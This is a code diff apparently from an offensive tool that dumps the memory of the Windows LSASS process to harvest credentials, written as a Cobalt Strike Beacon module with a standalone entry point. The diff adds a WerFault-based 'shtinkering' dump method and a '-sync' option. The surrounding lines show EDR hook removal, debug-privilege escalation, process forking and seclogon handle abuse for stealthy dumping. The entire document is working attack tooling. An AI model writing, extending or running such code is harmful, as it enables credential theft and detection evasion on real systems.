@@ -64,6 +64,9 @@ void go(char* args, int length)
     silent_process_exit = BeaconDataExtract(&parser, NULL);
     use_lsass_shtinkering = (BOOL)BeaconDataInt(&parser);
 
+    if (!write_dump_to_disk)
+        dump_path = NULL;
+
     remove_syscall_callback_hook();
 
     success = enable_debug_priv();
@@ -193,6 +196,14 @@ void go(char* args, int length)
             attributes);
         if (!hProcess)
             goto cleanup;
+    }
+
+    if (use_lsass_shtinkering)
+    {
+        werfault_shtinkering(
+            lsass_pid,
+            hProcess);
+        goto cleanup;
     }
 
     // avoid reading LSASS directly by making a fork
@@ -357,10 +368,17 @@ int main(int argc, char* argv[])
     UNICODE_STRING full_dump_path                 = { 0 };
     DWORD          attributes                     = 0;
     BOOL           running_as_system              = FALSE;
+    WCHAR          wcSnycPath[MAX_PATH]           = { 0 };
+    UNICODE_STRING synchronization_file           = { 0 };
+    BOOL           do_synchronize                 = FALSE;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
     full_dump_path.MaximumLength = 0;
+
+    synchronization_file.Buffer        = wcSnycPath;
+    synchronization_file.Length        = 0;
+    synchronization_file.MaximumLength = 0;
 
     dc.BaseAddress = NULL;
     dc.DumpMaxSize = 0;
@@ -492,6 +510,16 @@ int main(int argc, char* argv[])
                  !strncmp(argv[i], "--seclogon-duplicate", 21))
         {
             use_seclogon_duplicate = TRUE;
+        }
+        else if (!strncmp(argv[i], "-sync", 6))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing -sync value");
+                return 0;
+            }
+            do_synchronize = TRUE;
+            get_full_path(&synchronization_file, argv[++i]);
         }
 #ifdef _WIN64
         else if (!strncmp(argv[i], "-sc", 4) ||
@@ -702,20 +730,21 @@ int main(int argc, char* argv[])
     if (get_pid_and_leave)
     {
         PRINT(LSASS " PID: %ld", lsass_pid);
-        return 0;
+        ret_val = TRUE;
+        goto cleanup;
     }
 
     if (silent_process_exit)
     {
         // let the Windows Error Reporting process make the dump for us
-        werfault_silent_process_exit(lsass_pid, silent_process_exit);
-        return 0;
+        ret_val = werfault_silent_process_exit(lsass_pid, silent_process_exit);
+        goto cleanup;
     }
 
     if (use_seclogon_leak_local && !seclogon_leak_remote_binary)
         seclogon_leak_remote_binary = argv[0];
 
-    if (!is_seclogon_leak_local_stage_2 && !use_lsass_shtinkering)
+    if (!use_lsass_shtinkering)
     {
         if (!create_file(&full_dump_path))
             goto cleanup;
@@ -808,7 +837,7 @@ int main(int argc, char* argv[])
 
     if (use_lsass_shtinkering)
     {
-        werfault_shtinkering(
+        ret_val = werfault_shtinkering(
             lsass_pid,
             hProcess);
         goto cleanup;
@@ -887,7 +916,7 @@ cleanup:
         NtClose(hProcess);
     if (dc.BaseAddress && dc.DumpMaxSize)
         erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-    if (!ret_val)
+    if (!ret_val && dump_path)
         delete_file(dump_path);
     if (hSnapshot)
         free_snapshot(hSnapshot);
@@ -896,6 +925,8 @@ cleanup:
         kill_created_processes(created_processes);
         intFree(created_processes); created_processes = NULL;
     }
+    if (ret_val && do_synchronize)
+        create_file(&synchronization_file);
 
     return 0;
 }
